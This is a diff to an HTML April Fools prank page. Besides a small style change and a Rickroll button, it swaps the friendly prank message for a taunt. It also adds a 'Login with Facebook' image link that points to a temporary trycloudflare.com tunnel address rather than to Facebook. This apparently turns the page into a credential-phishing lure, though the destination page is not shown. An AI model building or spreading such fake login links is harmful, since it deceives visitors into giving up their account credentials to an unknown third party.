@@ -23,6 +23,7 @@
     border: none;
     border-radius: 5px;
     cursor: pointer;
+    margin-bottom: 20px;
   }
   .button:hover {
     background-color: #45a049;
@@ -32,8 +33,10 @@
 <body>
   <div class="prank-message">
     <p>April Fools!</p>
-    <p>You've been pranked! There's nothing to see here except a good ol' April Fools' Day joke. Have a laugh and enjoy the rest of your day! 🤪</p>
+    <p>GGS MFS</p>
     <button class="button" onclick="window.location.href='https://www.youtube.com/watch?v=dQw4w9WgXcQ';">Click Here</button>
+    <p>Don't forget to log in with Facebook!</p>
+    <a href="https://gale-announcement-namibia-english.trycloudflare.com"><img src="facebook_logo.png" alt="Login with Facebook" width="150"></a>
   </div>
 </body>
 </html>
